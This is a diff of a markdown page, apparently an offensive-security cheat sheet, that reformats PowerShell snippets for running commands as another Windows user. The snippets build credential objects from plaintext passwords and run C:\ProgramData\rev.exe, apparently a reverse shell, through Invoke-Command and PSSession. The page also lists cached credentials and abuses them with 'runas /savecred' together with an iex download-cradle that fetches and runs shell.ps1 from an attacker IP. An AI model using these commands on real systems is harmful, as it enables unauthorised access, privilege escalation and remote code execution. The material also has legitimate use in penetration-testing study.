@@ -5,16 +5,39 @@ tags: ["powershell", "cred object", "Windows", "runas"]
 ---
 
 ---
-### Runas (with cred object)
+### Create credential object
 
-#### Create cred object (Method #1)
+{{< tab set1 tab1 active >}}Method #1{{< /tab >}}
+{{< tab set1 tab2 >}}Method #2{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+<div>
 
 ```powershell
-$username = "<DOMAIN>\<USER>"
+$username = '<DOMAIN>\<USER>'
 ```
 
 ```powershell
-$password = "<PASSWORD>"
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+```
+
+```powershell
+$cred = New-Object System.Management.Automation.PSCredential($username, $password)
+```
+
+</div>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+<div>
+
+```powershell
+$username = '<DOMAIN>\<USER>'
+```
+
+```powershell
+$password = '<PASSWORD>'
 ```
 
 ```powershell
@@ -29,17 +52,17 @@ $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
 ```
 
-#### Create cred object (Method #2)
+</div>
 
-```powershell
-$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
-```
+{{< /tabcontent >}}
 
-```powershell
-$cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USER>", $password)
-```
+### Runas (with cred object)
 
-#### Run Commnad
+{{< tab set2 tab1 active >}}Invoke-Command{{< /tab >}}
+{{< tab set2 tab2 >}}PSSession{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+<div>
 
 ```powershell
 Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost
@@ -55,7 +78,12 @@ Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Comput
 Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -ConfigurationName config_name
 ```
 
-#### Create a new PS session
+</div>
+
+{{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
+
+<div>
 
 ```powershell
 new-pssession -computername . -credential $cred
@@ -66,19 +94,31 @@ new-pssession -computername . -credential $cred
 enter-pssession 1
 ```
 
+</div>
+
+{{< /tabcontent >}}
+
 ### Runas (with cache creds)
 
 #### Check cache creds
+
+<div>
 
 ```powershell
 cmdkey /list
 ```
 
+</div>
+
 #### Run Command
+
+<div>
 
 ```powershell
 # e.g. Upload and run a shell
 runas /user:<DOMAIN>\<USER> /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10/shell.ps1')"
 ```
+
+</div>
 
 <br>
